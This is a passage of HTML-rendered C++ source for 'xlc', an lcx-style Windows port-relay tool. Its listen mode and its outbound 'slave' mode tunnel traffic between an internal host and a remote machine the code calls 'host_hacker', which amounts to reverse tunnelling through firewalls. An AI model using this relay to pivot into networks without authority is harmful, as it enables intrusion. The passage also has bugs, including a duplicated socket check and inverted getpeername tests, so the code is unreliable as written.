atoi(argv[<span class="number">3</span>]));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(hostIp, argv[<span class="number">2</span>]);</span><br><span class="line">		<span class="built_in">strcpy</span>(slaveIp, argv[<span class="number">4</span>]);</span><br><span class="line">		slave(argv[<span class="number">2</span>], argv[<span class="number">4</span>], atoi(argv[<span class="number">3</span>]), atoi(argv[<span class="number">5</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//stricmp==strcmp ignore case忽略大小写</span></span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">4</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-listen&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//		cout&lt;&lt;&quot;Funlisten&quot;&lt;&lt;endl;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">6</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-slave&quot;</span>) == <span class="number">0</span> &amp;&amp; checkIP(argv[<span class="number">2</span>]) &amp;&amp; checkIP(argv[<span class="number">4</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		version();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*				listen 功能模块											*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Stu_sock	stu_sock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建套接字</span></span><br><span class="line">	SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//绑定端口到socket并监听</span></span><br><span class="line">	<span class="keyword">if</span> (!bindAndFunlisten(sock1, port1) || !bindAndFunlisten(sock2, port2))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//都监听好了接下来……</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> SizeOfAddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting for Client ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		sockaddr_in	remoteSockAddr;</span><br><span class="line">		<span class="comment">//sock1等待连接</span></span><br><span class="line">		SOCKET	recvSock1 = accept(sock1, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; recvSock1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">if</span> (recvSock1 &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port &quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting another Client on port:&quot;</span> &lt;&lt; port2 &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">		SOCKET	recvSock2 = accept(sock2, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; recvSock2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">if</span> (recvSock2 &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port&quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//两个都连上来了</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		stu_sock.s1 = recvSock1;		stu_sock.s2 = recvSock2;</span><br><span class="line">		DWORD	dwThreadID;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//创建一个转发数据的线程</span></span><br><span class="line">		HANDLE	hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line">		<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">return</span>;<span class="comment">//线程错了直接退出</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] CreateThread OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		Sleep(<span class="number">800</span>);<span class="comment">//挂起当前线程</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//地址结构</span></span><br><span class="line">	sockaddr_in	addr;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">	addr.sin_port = htons(port);</span><br><span class="line">	addr.sin_family = AF_INET;</span><br><span class="line">	addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> on = <span class="number">1</span>;</span><br><span class="line">	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;on, <span class="keyword">sizeof</span>(on));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//绑定地址结构</span></span><br><span class="line">	<span class="keyword">if</span> (bind(s, (<span class="keyword">const</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket bind error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//监听端口</span></span><br><span class="line">	<span class="keyword">if</span> (listen(s, <span class="number">5</span>) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Listen error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> host_slave[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">char</span> host_hacker[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	Stu_sock* stuSock = (Stu_sock*)data;</span><br><span class="line">	SOCKET	s1 = stuSock-&gt;s1;	<span class="comment">//接受的是slave的数据</span></span><br><span class="line">	SOCKET	s2 = stuSock-&gt;s2;	<span class="comment">//发送出去的socket</span></span><br><span class="line">	<span class="keyword">int</span>	sentacount1 = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//	cout&lt;&lt;stuSock-&gt;s1&lt;&lt;endl;</span></span><br><span class="line">	<span class="comment">//	cout&lt;&lt;stuSock-&gt;s2&lt;&lt;endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sockaddr_in	addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> sizeofaddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (getpeername(s1, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">strcpy</span>(host_slave, inet_ntoa(addr.sin_addr));</span><br><span class="line">		<span class="keyword">int</span> port_slave = ntohs(addr.sin_port);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (getpeername(s2, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">strcpy</span>(host_hacker, inet_ntoa(addr.sin_addr));</span><br><span class="line">		<span class="keyword">int</span> port_hacker = ntohs(addr.sin_port);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Start Transport (&quot;</span> &lt;&lt; host_slave &lt;&lt; <span class="string">&quot;&lt;-&gt; &quot;</span> &lt;&lt; host_hacker &lt;&lt; <span class="string">&quot;) ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">char</span> RecvBuffer[<span class="number">20480</span>];</span><br><span class="line">	<span class="keyword">char</span> SendBuffer[<span class="number">20480</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fd_set	readfd; fd_set	writefd;</span><br><span class="line">	timeval	timeset;</span><br><span class="line">	timeset.tv_sec = <span class="number">300</span>;</span><br><span class="line">	timeset.tv_usec = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> maxfd = max(s1, s2) + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> readsize;</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		readsize = <span class="number">0</span>;</span><br><span class="line">		FD_ZERO(&amp;readfd);</span><br><span class="line">		FD_ZERO(&amp;writefd);</span><br><span class="line">		FD_SET((UINT)s1, &amp;readfd);</span><br><span class="line">		FD_SET((UINT)s2, &amp;readfd);</span><br><span class="line">		FD_SET((UINT)s1, &amp;writefd);</span><br><span class="line">		FD_SET((UINT)s2, &amp;writefd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> result = select(maxfd, &amp;readfd, &amp;writefd, <span class="literal">NULL</span>, &amp;timeset);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (result &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Select error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket time out.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//没出错，没超时</span></span><br><span class="line">		<span class="keyword">if</span> (FD_ISSET(s1, &amp;readfd) &amp;&amp; flag)<span class="comment">///////////////////////////////////1</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//		if (totalread1&lt;20408)</span></span><br><span class="line">			&#123;</span><br><span class="line">				readsize = recv(s1, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//接受host的请求。。</span></span><br><span class="line">				<span class="keyword">if</span> (readsize == <span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (readsize == SOCKET_ERROR || readsize == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line">				<span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; flag &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////2</span></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">int</span> sendsize = send(s2, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//发给slave</span></span><br><span class="line">			<span class="keyword">if</span> (sendsize == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (sendsize &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; sendsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (FD_ISSET(s2, &amp;readfd) &amp;&amp; (!flag))<span class="comment">///////////////////////////////////3</span></span><br><span class="line">		&#123;</span><br><span class="line">			&#123;</span><br><span class="line">				readsize = recv(s2, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//接受slave返回数据</span></span><br><span class="line"></span><br><span class="line">				<span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="comment">//totalread1+=readsize;</span></span><br><span class="line">				<span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; (!flag) &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////4</span></span><br><span class="line">		&#123;</span><br><span class="line">			readsize = send(s1, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//发给host</span></span><br><span class="line">			<span class="keyword">if</span> (readsize == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (readsize &lt; <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		flag = !flag;</span><br><span class="line"></span><br><span class="line">		Sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	closesocket(s1);</span><br><span class="line">	closesocket(s2);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] OK! I Closed The Two Socket.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*				slave 功能模块											*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//checkIP(hostIp);</span></span><br><span class="line">	Stu_sock	stu_sock;</span><br><span class="line">	fd_set		fd;</span><br><span class="line">	<span class="keyword">char</span>		buffer[<span class="number">20480</span>];</span><br><span class="line">	<span class="keyword">int</span>			l;</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//创建套接字</span></span><br><span class="line">		SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">		SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="keyword">if</span> (client_connect(sock1, hostIp, destionPort) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			closesocket(sock1);</span><br><span class="line">			closesocket(sock2);</span><br><span class="line">			<span class="keyword">continue</span>;<span class="comment">/*跳过这次循环*/</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//把sock清零,加入set集</span></span><br><span class="line">			FD_ZERO(&amp;fd);</span><br><span class="line">			FD_SET(sock1, &amp;fd);</span><br><span class="line"></span><br><span class="line">			<span class="comment">//select事件	读 写 异常</span></span><br><span class="line">			<span class="keyword">if</span> (select(sock1 + <span class="number">1</span>, &amp;fd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == SOCKET_ERROR)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//不懂</span></span><br><span class="line">				<span class="keyword">if</span> (errno == WSAEINTR) <span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//FD_ISSET返回值&gt;0 表示SET里的可读写</span></span><br><span class="line">			<span class="keyword">if</span> (FD_ISSET(sock1, &amp;fd))</span><br><span class="line">			&#123;</span><br><span class="line">				l = recv(sock1, buffer, <span class="number">20480</span>, <span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			Sleep(<span class="number">5</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (l &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] There is a error...Create a new connection.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Connect OK!    \n[+] xlcTeam congratulations!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			fflush(<span class="built_in">stdout</span>);</span><br><span class="line">			<span class="keyword">if</span> (client_connect(sock2, slaveIp, slavePort) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				closesocket(sock1);</span><br><span class="line">				closesocket(sock2);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (send(sock2, buffer, l, <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send failed.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			l = <span class="number">0</span>;</span><br><span class="line">			<span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] All Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">		stu_sock.s1 = sock1;</span><br><span class="line">		stu_sock.s2 = sock2;</span><br><span class="line"></span><br><span class="line">		HANDLE	hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查IP地址格式是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (INADDR_NONE == inet_addr(str))</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;					<span class="comment">/*sock*/</span>		<span class="comment">/*远程IP*/</span>	<span class="comment">/*远程端口*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//声明</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">host</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(host = gethostbyname(server)))	<span class="comment">//获得远程主机的IP</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//   printf(&quot;[-] Gethostbyname(%s) error:%s\n&quot;,server,strerror(errno));</span></span><br><span class="line">		<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//给地址结构赋值</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;cliaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr));</span><br><span class="line">	cliaddr.sin_family = AF_INET;</span><br><span class="line">	cliaddr.sin_port = htons(port);<span class="comment">/*远程端口*/</span></span><br><span class="line">	cliaddr.sin_addr = *((struct in_addr*)host-&gt;h_addr);<span class="comment">//host ip</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//去连接远程正在listen的主机</span></span><br><span class="line">	<span class="keyword">if</span> (connect(sockfd, (struct sockaddr*) &amp; cliaddr, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//        printf(&quot;[-] Connect error.\r\n&quot;);</span></span><br><span class="line">		<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc v1.0 -Port Transport by Chris &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;      _     _____                    &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;__  _| | __|_   _|__  __ _ _ __ ___  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\\ \\/ / |/ __|| |/ _ \\/ _` | &#x27;_ ` _ \\ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span 